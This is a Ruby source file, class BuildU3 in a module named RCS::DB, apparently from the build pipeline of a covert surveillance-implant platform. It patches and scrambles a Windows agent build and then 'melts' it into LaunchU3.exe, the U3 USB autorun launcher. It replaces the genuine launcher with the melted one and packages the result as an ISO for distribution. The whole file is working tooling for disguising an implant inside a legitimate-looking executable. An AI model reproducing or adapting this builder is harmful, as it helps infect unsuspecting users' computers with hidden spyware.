#
# U3 iso creation
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildU3 < Build

  def initialize
    super
    @platform = 'u3'
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    build = Build.factory(:windows)
    build.load({'_id' => @factory._id})
    build.unpack
    build.patch params['binary'].dup
    build.scramble

    FileUtils.cp path('u3/LaunchU3.exe'), File.join(Dir.tmpdir, 'LaunchU3.exe')
    melt = params['melt'].dup
    melt['input'] = 'LaunchU3.exe'

    build.melt melt

    # copy the outputs in our directory
    build.outputs.each do |o|
      FileUtils.cp(File.join(build.tmpdir, o), path(o))
      @outputs << o
    end

    build.clean

    # overwrite the original launcher with the melted one
    FileUtils.mv path('output'), path('u3/LaunchU3.exe')

    # create the ISO image
    CrossPlatform.exec path('oscdimg'), "-j1 -lU3 #{path('u3')} #{path('output.iso')}"
    raise "ISO creation failed" unless File.exist? path('output.iso')

    @outputs = ['output.iso']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

end

end #DB::
end #RCS::
